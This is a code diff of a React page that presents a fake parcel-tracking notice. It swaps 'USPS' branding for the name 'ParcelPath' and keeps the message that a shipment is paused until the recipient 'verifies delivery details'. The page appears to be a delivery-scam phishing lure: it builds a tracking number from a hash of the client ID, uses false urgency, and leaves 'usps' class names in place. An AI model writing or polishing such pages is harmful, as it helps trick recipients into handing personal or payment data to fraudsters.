@@ -5,7 +5,7 @@ import { getClientId, setActivated } from '../session';
 import { BRAND, BRAND_PROMISES } from '../brand';
 
 function buildOrderNumber(clientId: string) {
-  const seed = (clientId || 'usps-order-seed').replace(/[^a-zA-Z0-9]/g, '');
+  const seed = (clientId || 'parcelpath-order-seed').replace(/[^a-zA-Z0-9]/g, '');
   let hash = 0;
   for (let i = 0; i < seed.length; i += 1) {
     hash = (hash * 33 + seed.charCodeAt(i)) >>> 0;
@@ -99,14 +99,14 @@ export default function Home() {
       <div className="alz-shell">
         <section className="alz-usps-intro">
           <div className="alz-usps-intro-copy">
-            <div className="alz-usps-eyebrow">USPS Tracking</div>
-            <h1 className="alz-usps-title">Your package is on hold pending final delivery confirmation</h1>
+            <div className="alz-usps-eyebrow">Delivery Tracking</div>
+            <h1 className="alz-usps-title">Your shipment is paused pending final recipient confirmation</h1>
             <p className="alz-usps-lead">
-              USPS needs an updated recipient confirmation before this shipment can move to the next delivery step. Review the
-              tracking information and verify the delivery details to continue processing.
+              ParcelPath needs an updated recipient confirmation before this shipment can move to the next delivery step. Review
+              the tracking information and verify the delivery details to continue processing.
             </p>
             <div className="alz-usps-intro-meta">
-              <span>Expected service: Priority Mail</span>
+              <span>Expected service: Standard parcel delivery</span>
               <span>Latest event: Address confirmation required</span>
             </div>
           </div>
@@ -117,7 +117,7 @@ export default function Home() {
             </div>
             <div className="alz-usps-track-number">{orderNumber}</div>
             <div className="alz-usps-track-meta">Updated {orderPlacedDate}</div>
-            <div className="alz-usps-track-state">USPS Tracking Status Available</div>
+            <div className="alz-usps-track-state">Live delivery status available</div>
           </div>
         </section>
 
@@ -126,7 +126,7 @@ export default function Home() {
             <div className="alz-usps-service-kicker">Delivery Action Required</div>
             <h2 className="alz-usps-service-title">Delivery is temporarily paused</h2>
             <p className="alz-usps-service-copy">
-              USPS could not complete delivery using the recipient details currently associated with this shipment.
+              ParcelPath could not complete delivery using the recipient details currently associated with this shipment.
               Confirm the delivery information to continue processing.
             </p>
             <div className="alz-brand-row">
@@ -151,7 +151,7 @@ export default function Home() {
               </div>
               <div className="alz-usps-detail-row">
                 <span>Shipment Type</span>
-                <strong>Priority Mail parcel</strong>
+                <strong>Standard parcel delivery</strong>
               </div>
               <div className="alz-usps-detail-row">
                 <span>Last Activity</span>
@@ -189,7 +189,7 @@ export default function Home() {
             <div>
               <h3 className="alz-usps-info-title">Avoid delays</h3>
               <p className="alz-usps-info-copy">
-                Completing the verification now helps USPS continue delivery without additional delays.
+                Completing the verification now helps ParcelPath continue delivery without additional delays.
               </p>
             </div>
           </article>
@@ -198,16 +198,16 @@ export default function Home() {
         <section className="alz-usps-support-card">
           <div className="alz-usps-support-copy">
             <div className="alz-usps-service-kicker">Need Assistance?</div>
-            <h3 className="alz-usps-service-title">Why USPS is asking for this</h3>
+            <h3 className="alz-usps-service-title">Why this confirmation is required</h3>
             <p className="alz-usps-service-copy">
-              A mismatch was detected in the delivery information associated with this shipment. USPS needs updated
+              A mismatch was detected in the delivery information associated with this shipment. ParcelPath needs updated
               recipient details to release the package for delivery.
             </p>
           </div>
           <div className="alz-usps-support-side">
             <div className="alz-usps-support-status">Tracking #{orderNumber}</div>
             <div className="alz-usps-support-note">Delivery resumes after the required information is confirmed.</div>
-            <div className="alz-usps-support-help">Need help? Visit USPS support for assistance with your shipment.</div>
+            <div className="alz-usps-support-help">Need help? Visit the delivery support center for assistance with your shipment.</div>
           </div>
         </section>
 
